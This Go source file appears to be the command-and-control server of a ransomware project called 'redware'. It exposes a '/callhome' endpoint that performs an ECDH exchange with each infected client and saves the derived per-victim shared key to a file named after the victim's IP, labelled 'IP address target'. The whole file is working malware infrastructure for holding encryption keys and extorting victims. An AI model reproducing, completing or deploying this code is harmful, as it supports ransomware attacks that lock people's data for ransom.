package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"

	"fmt"
)

type Key struct {
	CurveParams *elliptic.CurveParams `json:"Curve"`
	X           *big.Int              `json:"X"`
	Y           *big.Int              `json:"Y"`
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}

// Note: not importing from redware package as server should be stand-alone

func svECDHgen(pkX *big.Int, pkY *big.Int) (ecdsa.PublicKey, [32]byte) {
	privs, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	pubs := privs.PublicKey
	s, _ := pubs.Curve.ScalarMult(pkX, pkY, privs.D.Bytes())
	sharedServerKey := sha256.Sum256(s.Bytes())

	return pubs, sharedServerKey
}

func server() {
	http.HandleFunc("/callhome", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/callhome" {
			http.Error(w, "404 not found", http.StatusNotFound)
			return
		}
		switch r.Method {
		case "GET":
			//TODO:figure out what to do here
		case "POST":
			// Decode public key received and generate shared key using svECH function
			pubkt := new(Key) 
			jsonerr := json.NewDecoder(r.Body).Decode(&pubkt)
			check(jsonerr)
			defer r.Body.Close()
			pubks, sSk := svECDHgen(pubkt.X, pubkt.Y)
			fmt.Printf("\nServer public key generated: %v", pubks)
			fmt.Printf("\nServer shared key generated: %x", sSk)
			// Json encode pubkey of server to send back to client
			msPubkeyS := pubks
			err := json.NewEncoder(w).Encode(&msPubkeyS)
			check(err)
			
			//Saving details
			//future improvement: Save in database with unique identifier.
			// save ip
			ip := r.RemoteAddr
			if len(ip) >10{
				ip = strings.ReplaceAll(ip,":","")[:14]
				fmt.Printf("\n IP address target: %v", ip)
			}else{
				ip = strings.ReplaceAll(ip,":","")
				fmt.Println("no ip address found")
			}
			// generate timestamp
			timestamp := time.Now()
			//save to file
			// update file lcoation here
			filelocation := "C:/Users/super/Desktop/"
			filename := filelocation + ip + ".txt"
			file, err := os.Create(filename)
			check(err)
			defer file.Close()
			file.WriteString(timestamp.String())
			file.WriteString("\n")
			file.WriteString(hex.EncodeToString(sSk[:]))
		default:
		}
	})
	if err := http.ListenAndServe("192.168.178.36:8010", nil); err != http.ErrServerClosed {
		panic(err)
	}
}

func main() {
	server()
	time.Sleep(time.Second)
}
